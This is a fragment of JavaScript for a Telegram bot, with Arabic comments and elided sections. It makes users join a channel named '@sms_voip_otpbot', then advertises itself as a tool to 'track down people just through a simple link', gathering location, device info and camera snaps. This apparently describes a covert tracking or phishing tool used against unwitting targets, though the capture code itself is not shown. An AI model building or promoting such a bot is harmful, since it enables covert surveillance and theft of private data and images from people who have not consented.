...
bot.onText(/\/start/, (msg) => {
    ...
    const channelName = '@sms_voip_otpbot';
    bot.getChatMember(channelName, msg.from.id).then((result) => {
      if (result.status === 'member' || result.status === 'administrator' || result.status === 'creator') {
        // تم الاشتراك في القناة
      } else {
        // إذا لم يتم الاشتراك في القناة، يتم إرسال رسالة تشجيع الاشتراك في القناة
        bot.sendMessage(chatId, `Please subscribe to our channel, ${channelName}, to use this bot.`);
```
    }).catch((error) => {
      console.log(error);
    });
...
bot.sendMessage(chatId, "Welcome ${msg.chat.first_name}! You can use this bot to track down people just through a simple link. It can gather information like location, device info, camera snaps. Type /help for more info.", m);
